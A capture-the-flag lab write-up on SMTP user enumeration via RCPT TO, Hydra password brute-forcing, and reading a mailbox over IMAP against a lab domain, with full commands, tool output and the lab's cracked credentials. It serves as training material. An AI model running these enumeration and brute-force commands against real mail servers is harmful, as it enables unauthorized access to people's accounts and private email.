---
tags: [lab, attack/network, enumeration/smtp]
module: attacking_common_services
last_updated: 2026-05-12
source_count: 1
---

# HTB Lab — SMTP User Enumeration and Mail Access

**Difficulty:** Easy
**Target domain:** inlanefreight.htb
**Target IP:** STMIP (your spawned machine IP)

Two questions: enumerate a valid SMTP user, brute-force their password, then read the flag out of their inbox over IMAP.

---

## Question 1

> What is the available username for domain inlanefreight.htb in the SMTP server?

### Why this works

SMTP servers can be queried to check whether a username exists before authentication is ever attempted. The server's job is to accept or reject mail — so asking it "does this recipient exist?" leaks user account information. Three SMTP commands expose this:

| Command | How it works | Availability |
|---------|-------------|--------------|
| `VRFY <user>` | Server explicitly confirms or denies the user exists | Often disabled in modern configs |
| `EXPN <alias>` | Expands a mailing list alias to show member addresses | Rarely enabled |
| `RCPT TO:<user@domain>` | Attempts to address mail to the user — `250 OK` means the user exists, `550` means they don't | Most widely supported; harder to disable without breaking mail delivery |

Because VRFY is commonly disabled and EXPN is almost never available, `RCPT TO` is the most reliable method for user enumeration. It works even on servers where the other two are blocked, because the server must accept or reject addresses to function as a mail server.

### Step 1 — Get the users wordlist

This lab uses `users.list` from the HTB module resources (downloadable from the Academy page for the Attacking Common Services module). Save it to your working directory before running the enumeration.

Alternatively, a general-purpose SMTP username list from SecLists works as a substitute:

```bash
/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt
```

### Step 2 — Enumerate valid users with smtp-user-enum

```bash
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t STMIP
```

| Flag | What it does |
|------|-------------|
| `-M RCPT` | Use `RCPT TO` as the enumeration method (most reliable) |
| `-U users.list` | Wordlist of candidate usernames to test |
| `-D inlanefreight.htb` | Domain to append — tests `user@inlanefreight.htb` format |
| `-t STMIP` | Target IP of the SMTP server |

Expected output (truncated):

```
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Jun 30 22:02:35 2022 ###
10.129.x.x: marlin@inlanefreight.htb exists
######## Scan completed at Thu Jun 30 22:02:42 2022 ###
1 results.

79 queries in 7 seconds (11.3 queries / sec)
```

**Answer: `marlin`**

The tool tried 79 usernames from the wordlist, constructing addresses in the form `<username>@inlanefreight.htb` and sending a `RCPT TO` command for each. The server returned a `250 OK` only for `marlin`, confirming the account exists.

---

## Question 2

> Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.

You have a confirmed username (`marlin@inlanefreight.htb`) but no password. The attack chain:

1. Brute-force the SMTP password with Hydra
2. Log into the mailbox over IMAP using the found credentials
3. Fetch the email containing the flag

### Step 1 — Brute-force the SMTP password

```bash
hydra -l marlin@inlanefreight.htb \
      -P /usr/share/wordlists/rockyou.txt \
      -f STMIP smtp
```

| Flag | What it does |
|------|-------------|
| `-l marlin@inlanefreight.htb` | Single username in full email format (required for SMTP AUTH) |
| `-P rockyou.txt` | Password wordlist |
| `-f` | Stop as soon as one valid credential pair is found |
| `smtp` | Protocol module — connects to TCP/25 and tests SMTP AUTH |

> **Note:** rockyou ships compressed on Kali. If the path above fails, decompress it first:
> ```bash
> gunzip /usr/share/wordlists/rockyou.txt.gz
> ```

Expected output:

```
[25][smtp] host: 10.129.x.x   login: marlin@inlanefreight.htb   password: poohbear
1 of 1 target successfully completed, 1 valid password found
```

Credentials: `marlin@inlanefreight.htb` / `poohbear`

### Step 2 — Log into the mailbox over IMAP

Now that you have credentials, connect to the IMAP service (TCP/143) to read the inbox. IMAP lets you interact with the mailbox server-side without downloading everything first.

```bash
telnet STMIP 143
```

Once connected you'll see a banner like `* OK IMAPrev1`. IMAP uses **tagged commands** — each command is prefixed with a unique tag (any string works; sequential numbers are conventional) so the server can match responses to requests.

```
11 login "marlin@inlanefreight.htb" "poohbear"
```

The server responds `11 OK LOGIN completed` if the credentials are accepted.

```
12 select "INBOX"
```

`select` opens a mailbox folder. The server responds with metadata:

```
* 1 EXISTS        ← 1 message in the inbox
* 1 RECENT        ← 1 unread message
* FLAGS (...)
12 OK [READ-WRITE] SELECT completed
```

```
13 FETCH 1 BODY[]
```

`FETCH 1 BODY[]` retrieves the full content of message 1 — headers and body. The flag is in the email body.

#### Full session

```
$ telnet STMIP 143
Trying STMIP...
Connected to STMIP.
Escape character is '^]'.
* OK IMAPrev1
11 login "marlin@inlanefreight.htb" "poohbear"
11 OK LOGIN completed
12 select "INBOX"
* 1 EXISTS
* 1 RECENT
* FLAGS (\Deleted \Seen \Draft \Answered \Flagged)
* OK [UIDVALIDITY 1650465305] current uidvalidity
* OK [UIDNEXT 2] next uid
* OK [PERMANENTFLAGS (\Deleted \Seen \Draft \Answered \Flagged)] limited
12 OK [READ-WRITE] SELECT completed
13 FETCH 1 BODY[]
* 1 FETCH (BODY[] {640}
Return-Path: marlin@inlanefreight.htb
Subject: Password change
From: marlin <marlin@inlanefreight.htb>
To: administrator@inlanefreight.htb

Hi admin,

How can I change my password to something more secure?

flag: HTB{...}

)
13 OK FETCH completed
```

**Submit the flag value from the email body.**

---

## Understanding the IMAP command format

IMAP commands follow the pattern `<tag> <command> <arguments>`. The tag is arbitrary — you pick it. Sequential numbers are conventional and make it easy to match the server's tagged responses back to your commands. The server prefixes untagged responses with `*` (informational data) and prefixes the final response with your tag (completion status).

| Command | What it does |
|---------|-------------|
| `<tag> login "<user>" "<pass>"` | Authenticate to the server |
| `<tag> list "" "*"` | List all available mailbox folders |
| `<tag> select "INBOX"` | Open a folder for reading |
| `<tag> search ALL` | List all message sequence numbers in the selected folder |
| `<tag> fetch <n> BODY[]` | Download full content of message n (headers + body) |
| `<tag> fetch <n> BODY[TEXT]` | Download only the body (no headers) |
| `<tag> logout` | Close the session |

### Alternative: curl for IMAP access

If you prefer not to type raw IMAP, curl can speak the protocol:

```bash
# List folders
curl -u marlin@inlanefreight.htb:poohbear imap://STMIP/

# Fetch message 1 from INBOX
curl -u marlin@inlanefreight.htb:poohbear imap://STMIP/INBOX;UID=1
```

---

## Why SMTP auth and IMAP auth share the same password

SMTP and IMAP are separate services, but they typically authenticate against the same mail account database on the server. Cracking SMTP auth credentials therefore also gives you IMAP (and POP3) access to the same account — one password unlock opens the whole mailbox.

---

## Lessons learned

- **RCPT TO is the most durable user enumeration method** — VRFY is commonly disabled; RCPT is harder to remove because the server needs it to function. Always try RCPT first.
- **Full email format for SMTP auth** — Hydra's `-l` flag should use `user@domain`, not just `user`, when the server requires the full address for SMTP AUTH.
- **IMAP for reading mail** — once you have credentials, IMAP gives you full mailbox access with server-side folder navigation; POP3 works too but is simpler and less capable.
- **Weak passwords on mail accounts** — email accounts frequently hold credentials, business communications, and password reset links. A weak password on a mail account is often a high-severity finding.

## Related pages

- [[attack/smtp]] — full SMTP attack reference: enumeration, O365 spray, open relay, CVE-2020-7247
- [[enumeration/smtp]] — VRFY/EXPN/RCPT TO manual enumeration, banner grabbing
- [[enumeration/imap_pop3]] — IMAP and POP3 command reference, TLS access, curl syntax
- [[tools/enumeration/smtp_user_enum]] — smtp-user-enum flags and mode comparison
- [[tools/attack/hydra]] — brute-force syntax for SMTP, POP3, and other protocols

## Sources

- raw/lab/attacking_common_services/attacking_email.md
